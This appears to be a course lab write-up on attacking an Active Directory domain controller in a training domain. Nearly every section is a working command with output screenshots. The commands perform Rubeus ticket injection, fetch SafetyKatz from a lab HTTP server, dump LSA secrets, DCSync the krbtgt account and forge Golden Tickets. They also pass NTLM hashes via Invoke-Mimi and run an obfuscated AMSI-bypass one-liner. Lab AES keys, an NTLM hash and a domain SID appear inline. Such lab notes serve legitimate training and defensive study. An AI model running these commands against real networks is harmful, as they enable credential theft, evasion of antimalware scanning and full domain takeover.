# 🎟️ Extract secrets from DC, Create and use Golden Tickets

So after getting domain admin privileges, we will encode parameters as usual and run the rubeus command and ask for tgt and spawn a shell with domain admin privileges ->

<figure><img src="../../.gitbook/assets/image (1109).png" alt=""><figcaption><p>Running the rubeus command makes a shell spawn with DA privileges</p></figcaption></figure>

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Now we're going to copy Loader.exe on dcorp-dc:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
#now let's hop on the dcorp-dc machine
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.13
```

<figure><img src="../../.gitbook/assets/image (1111).png" alt=""><figcaption><p>Beware the path is dcorp-dc and not dcorpdc like in the manual</p></figcaption></figure>

Now we're going to use ArgSplit on the student VM to encode `lsadump::lsa`

<figure><img src="../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

And then we will put it on the Admin instance that popped&#x20;

This will allow us to run the following command (don't forget to run a wsl python server to go and fetch the SafteyKatz exe)

```
C:\Users\Public\Loader.exe -path http://172.13.100.13:5454/SafetyKatz.exe -args "%Pwn% /patch" "exit"
```

<figure><img src="../../.gitbook/assets/image (1112).png" alt=""><figcaption></figcaption></figure>

And this will dump the hashes we need:

<figure><img src="../../.gitbook/assets/image (1113).png" alt=""><figcaption></figcaption></figure>

***

To get NTLM hash and AES keys of the krbtgt account, we can use the DCSync attack, now try encoding `lsadump::dcsync`

And we can run the following:

```
C:\Users\Public\Loader.exe -path http://172.16.100.13:5454/SafetyKatz.exe -args "%Pwn% /user:dcorp\krbtgt" "exit"
```

<figure><img src="../../.gitbook/assets/image (1114).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1115).png" alt=""><figcaption></figcaption></figure>

Now we could use the below Rubeus command to generate an OPSEC friendly command for Golden ticket.

Let's first encode "golden"

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This will generate a command to forge a golden ticket:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We need to add /ptt at the end of the generated command to inject it in the current process.

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:35 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we can access dcorp-dc as admin:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

We can also use BetterSafetyKatz.exe to create a Golden ticket. Run the below command from an elevated command prompt.

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>We can see ticket is cached</p></figcaption></figure>

Here is a POC we have RCE on dcorp-dc ->

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>dir \dcorp-dc\c$</p></figcaption></figure>

***

We can also use PowerShell Remoting and Invoke-Mimi.ps1 to start a process with DA privileges, we'll need to throw this from a elevated shell:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd.exe"'
```

And this will pop a shell:

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now in the DA process ->

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
$sess = New-PSSession -ComputerName dcorp-dc
Enter-PSSession $sess
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n'ULl},${t'RuE} )
 exit
 Invoke-Command -FilePath .\Invoke-Mimi.ps1 -Session $sess
 Enter-PSSession $sess
 Invoke-Mimi -Command '"lsadump::lsa /patch"'
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And just like that we are able to dump the hashes

***

Theres some other stuff in the course, go check
